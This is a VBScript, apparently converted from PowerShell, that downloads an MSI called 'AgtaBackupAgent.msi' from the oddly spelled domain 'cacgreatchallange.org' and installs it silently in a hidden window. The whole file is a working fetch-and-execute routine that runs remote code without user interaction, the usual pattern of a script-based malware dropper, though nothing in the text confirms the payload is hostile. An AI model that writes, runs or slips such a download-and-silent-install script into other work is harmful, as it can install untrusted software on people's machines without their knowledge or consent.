' Convert of:
' Invoke-WebRequest -Uri "https://cacgreatchallange.org/AgtaBackupAgent.msi" -OutFile "$env:TEMP\AgtaBackupAgent.msi";
' msiexec /i "$env:TEMP\AgtaBackupAgent.msi" /qn /l*v "$env:TEMP\agta-install.log"

Option Explicit

Dim shell, fso, tempDir, msiPath, logPath, url, http, stream, cmd, rc

url     = "https://cacgreatchallange.org/AgtaBackupAgent.msi"
Set shell = CreateObject("WScript.Shell")
Set fso   = CreateObject("Scripting.FileSystemObject")

tempDir = shell.ExpandEnvironmentStrings("%TEMP%")
msiPath = tempDir & "\AgtaBackupAgent.msi"
logPath = tempDir & "\agta-install.log"

' ---- 1) Download the MSI (equivalent to Invoke-WebRequest) ----
On Error Resume Next
Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
http.open "GET", url, False
http.send

If Err.Number <> 0 Then
    WScript.Echo "Download error: " & Err.Description
    WScript.Quit 1
End If
On Error GoTo 0

If http.Status <> 200 Then
    WScript.Echo "Download failed. HTTP " & http.Status
    WScript.Quit 1
End If

Set stream = CreateObject("ADODB.Stream")
stream.Type = 1                     ' adTypeBinary
stream.Open
stream.Write http.responseBody
If fso.FileExists(msiPath) Then fso.DeleteFile msiPath, True
stream.SaveToFile msiPath, 2        ' adSaveCreateOverWrite
stream.Close
Set stream = Nothing
Set http   = Nothing

If Not fso.FileExists(msiPath) Then
    WScript.Echo "MSI not found at " & msiPath
    WScript.Quit 1
End If

' ---- 2) Silent install with verbose log (equivalent to msiexec line) ----
cmd = "msiexec.exe /i """ & msiPath & """ /qn /l*v """ & logPath & """"
rc = shell.Run(cmd, 0, True)        ' 0 = hidden window, True = wait

WScript.Quit rc
